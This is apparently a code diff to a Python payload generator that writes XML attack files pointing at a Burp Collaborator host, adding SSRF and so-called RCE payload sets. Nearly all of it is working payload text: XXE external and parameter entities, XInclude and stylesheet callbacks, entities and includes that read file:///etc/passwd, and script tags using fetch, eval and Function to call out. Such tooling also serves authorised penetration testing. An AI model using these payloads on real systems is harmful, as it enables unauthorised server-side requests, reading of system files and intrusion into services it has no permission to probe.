@@ -21,9 +21,15 @@ def generate_xml_payloads(output_dir, burp_collab, tech_filter='all', payload_ty
     output_dir.mkdir(parents=True, exist_ok=True)
     base_url = f"http://{burp_collab}"
     
+    if should_generate_type('ssrf'):
+        ssrf_dir = output_dir / 'ssrf'
+        ssrf_dir.mkdir(exist_ok=True)
     if should_generate_type('xxe'):
         xxe_dir = output_dir / 'xxe'
         xxe_dir.mkdir(exist_ok=True)
+    if should_generate_type('rce') or should_generate_type('deserialization'):
+        rce_dir = output_dir / 'rce'
+        rce_dir.mkdir(exist_ok=True)
     if should_generate_type('xss'):
         xss_dir = output_dir / 'xss'
         xss_dir.mkdir(exist_ok=True)
@@ -121,6 +127,98 @@ def generate_xml_payloads(output_dir, burp_collab, tech_filter='all', payload_ty
     if should_generate_type('xss'):
         with open(xss_dir / "xss4_stylesheet.xml", 'w', encoding='utf-8') as f:
             f.write(xml_xss4_stylesheet)
+    
+    if should_generate_type('ssrf'):
+        xml_ssrf1_entity = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "{base_url}/ssrf-xml-1">
+]>
+<root>
+<data>&xxe;</data>
+</root>'''
+        with open(ssrf_dir / "ssrf1_entity.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_ssrf1_entity)
+        
+        xml_ssrf2_https = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "https://{burp_collab}/ssrf-xml-2">
+]>
+<root>
+<data>&xxe;</data>
+</root>'''
+        with open(ssrf_dir / "ssrf2_https.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_ssrf2_https)
+        
+        xml_ssrf3_parameter = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "{base_url}/ssrf-xml-3">
+%xxe;
+]>
+<root>
+<data>test</data>
+</root>'''
+        with open(ssrf_dir / "ssrf3_parameter.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_ssrf3_parameter)
+        
+        xml_ssrf4_stylesheet = f'''<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet href="{base_url}/ssrf-xml-4"?>
+<root>
+<data>test</data>
+</root>'''
+        with open(ssrf_dir / "ssrf4_stylesheet.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_ssrf4_stylesheet)
+        
+        xml_ssrf5_xinclude = f'''<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include href="{base_url}/ssrf-xml-5" parse="text"/>
+</root>'''
+        with open(ssrf_dir / "ssrf5_xinclude.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_ssrf5_xinclude)
+    
+    if should_generate_type('rce') or should_generate_type('deserialization'):
+        xml_rce1_xslt = f'''<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="{base_url}/rce-xml-xslt1"?>
+<root>
+<data>test</data>
+</root>'''
+        with open(rce_dir / "rce1_xslt.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_rce1_xslt)
+        
+        xml_rce2_entity_script = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+<script>&xxe;</script>
+</root>'''
+        with open(rce_dir / "rce2_entity_script.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_rce2_entity_script)
+        
+        xml_rce3_xinclude_exec = f'''<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include href="file:///etc/passwd" parse="text"/>
+<script>fetch('{base_url}/rce-xml-xinclude1?executed=true')</script>
+</root>'''
+        with open(rce_dir / "rce3_xinclude_exec.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_rce3_xinclude_exec)
+        
+        xml_rce4_xxe_eval = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "{base_url}/rce-xml-xxe1">
+]>
+<root>
+<script>eval('fetch(\\'{base_url}/rce-xml-eval1\\')')</script>
+<data>&xxe;</data>
+</root>'''
+        with open(rce_dir / "rce4_xxe_eval.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_rce4_xxe_eval)
+        
+        xml_rce5_function = f'''<?xml version="1.0" encoding="UTF-8"?>
+<root>
+<script>Function('fetch(\\'{base_url}/rce-xml-function1\\')')()</script>
+</root>'''
+        with open(rce_dir / "rce5_function.xml", 'w', encoding='utf-8') as f:
+            f.write(xml_rce5_function)
     
     xml_path1_relative = f'''<?xml version="1.0" encoding="UTF-8"?>
 <root>
